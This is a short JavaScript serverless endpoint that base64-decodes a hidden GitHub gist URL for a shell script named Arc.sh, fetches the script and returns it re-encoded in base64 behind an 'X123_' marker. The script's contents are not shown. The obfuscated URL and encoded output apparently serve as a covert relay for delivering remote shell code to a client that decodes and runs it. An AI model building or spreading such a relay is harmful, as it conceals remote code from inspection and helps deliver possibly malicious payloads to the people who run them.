export default async function handler(req, res) {
  // Link Gist Lu
  const G = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9WYW5uWEQwL2U3YmEzNGYxZDY0MWQ0MGYyMDlmYzBiZjg5OWJjNjZmL3Jhdy9hNjIzNzk5ZjkwZGU5MTIwZDkwNGNiNWNlNmYwZGNhOWVmMDkwOTM0L0FyYy5zaA==";
  const U = Buffer.from(G, 'base64').toString('utf8');
  
  try {
    const R = await fetch(U);
    const S = await R.text();
    const P = Buffer.from(S).toString('base64');
    res.status(200).send("X123_" + P);
  } catch (e) {
    res.status(500).send("ERR");
  }
}
